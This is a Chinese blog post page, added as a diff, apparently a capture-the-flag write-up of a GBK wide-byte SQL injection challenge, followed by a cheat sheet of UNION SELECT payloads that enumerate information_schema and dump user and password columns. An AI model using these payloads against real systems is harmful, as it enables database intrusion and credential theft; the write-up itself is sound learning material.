@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="zh_CN">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="记一次手注"/><link rel="alternate" href="/atom.xml" title="Saltneko"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="http://yoursite.com/2019/10/23/记一次手注/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":"app_id:sB2SP6AaImiT4x3A8ms2stxj-gzGzoHsz app_key:69kbIXu3HeNAasY9m6mbX6fa","toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>记一次手注 - Saltneko</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Saltneko</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/archives/">
+        <li class="mobile-menu-item">Archives
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories
+          </li>
+      </a><a href="/link/">
+        <li class="mobile-menu-item">Link
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Saltneko</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            Archives
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            Categories
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/link/">
+            Link
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">记一次手注
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-10-23
+        </span><span class="post-category">
+            <a href="/categories/SQL/">SQL</a>
+            <a href="/categories/SQL/Web/">Web</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#步骤"><span class="toc-text">#步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#整理："><span class="toc-text">#整理：</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><p>手注爆库用户信息 题目来源NJUPT平台</p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="#步骤"></a>#步骤</h3><p>题目来自NJUPT平台 <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a><br>1.<code>id=2</code> 得到Tips：<code>gbk_sql_injection</code>宽字节注入<br>2.<code>id=%df%27 or 1 = 1%23 your sql:select id,title from news where id = ‘運’ or 1 = 1#’</code><br>3.<br><code>id=%df%27 union select 1,database() from news%23</code>爆出库名 <code>sae-chinalover</code>/<br><code>id=%df%27 and 1=2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1--+%23</code>也可以 然后<code>sae-chinalover</code>十六进制转换为 <code>0x7361652D6368696E616C6F766572</code><br>4.<code>id=%df%27 and 1=2 union select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x7361652D6368696E616C6F766572%23</code><br>爆出表名 <code>ctf</code>,<code>ctf2</code>,<code>ctf3</code>,<code>ctf4</code>,<code>news</code><br>十六进制转换分别为<code>0x637466</code>，<code>0x63746632</code>，<code>0x63746633</code>，<code>0x63746634</code>，<code>0x6E657773</code><br>5.<code>id=%df%27 and 1=2 union select 1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x637466%23/0x63746632/0x63746633/0x63746634/0x6E657773</code>最后在表<code>ctf4</code>中得到<code>flag</code>字段<br>6.<br><code>id=%df%27 and 1=2 union select 1,group_concate(flag) from ctf4</code>得到Flag：nctf{gbk_3sqli}</p>
+<a id="more"></a>
+<p>#相关参考：<br>暴库 (mysql&gt;5.0)<br>Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息<br><code>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1</code></p>
+<p>猜表<br><code>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）—</code></p>
+<p>猜字段<br><code>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1</code><br>暴密码<br><code>and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1</code></p>
+<p>高级用法（一个可用字段显示两个数据内容）：<br><code>Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1</code></p>
+<h3 id="整理："><a href="#整理：" class="headerlink" title="#整理："></a>#整理：</h3><p>1.比起limit挨个移位暴破 可以使用<code>group_concat()</code>函数一起显示 但是有长度限制。可能显示不全。<br>2.存有Flag的数据库的结构暂存在主体的数据库里 通过<code>information_schema.SCHAMATA/TABLES/COLUMNS(</code>数据库/数据表/字节）跨库访问<br>3.注意前后的字段数量必须相同，如题中存在id和title俩个字段，则构造时select后也跟俩个值，且注意俩个值的顺序-只爆出第二个值</p>
+
+      </div>
+      
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="prev" href="/2019/10/23/%E5%AD%A6%E6%9C%AF%E5%AE%89%E5%85%A8/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">学术安全</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    <a class="next" href="/2019/10/23/Web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/">
+        <span class="next-text nav-default">Web前端安全</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div>
+  <div class="comments" id="comments">
+    
+  </div>
+</div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:1281714262@qq.com" target="_blank" rel="noopener" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/SaLTNEko" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2015 - 2020<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Salt</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
